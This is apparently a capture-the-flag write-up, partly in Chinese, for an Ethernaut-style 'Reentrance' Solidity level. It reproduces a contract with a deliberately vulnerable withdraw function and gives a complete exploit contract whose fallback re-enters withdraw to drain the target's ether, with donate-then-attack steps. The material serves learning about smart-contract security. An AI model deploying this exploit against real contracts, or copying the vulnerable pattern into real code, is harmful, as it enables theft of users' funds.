## 0x01 Task

```javascript
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
      // 首先确定是否有足够资产提币
      // 然后使用msg.sender.call.value(_amount)()发送eth
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
        // 处理完毕 修改账户
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```

The goal of this level is for you to steal all the funds from the contract.

## 0x02 Solution

```
<address>.call.value()()
```

- 当发送失败时会返回 false
- 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）

使用 `msg.sender.call.value(amount)()` 传递了所有可用 Gas 供调用，也是可以成功执行递归的前提条件。

![image-20200508100804569](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200508100805.png)

exp:

```javascript
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract exp {

    address instance_address = 0xe0216ad7f44524508a87036609c91f85ff6343bf;
    Reentrance target = Reentrance(instance_address);

    function exp() payable{}

    function donate() public payable {
        target.donate.value(msg.value)(this);
    }

    function attack() public {
        //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以
        target.withdraw(0.5 ether);
        target.withdraw(0.5 ether);
    }

    function get_balance() public view returns(uint) {
        return target.balanceOf(this);
    }

    function my_eth_bal() public view returns(uint) {
        return address(this).balance;
    }

    function ins_eth_bal() public view returns(uint) {
        return instance_address.balance;
    }

    function () public payable {
        //同理写两次
        target.withdraw(0.5 ether);
        target.withdraw(0.5 ether);
    }
}
```

先donate，再attack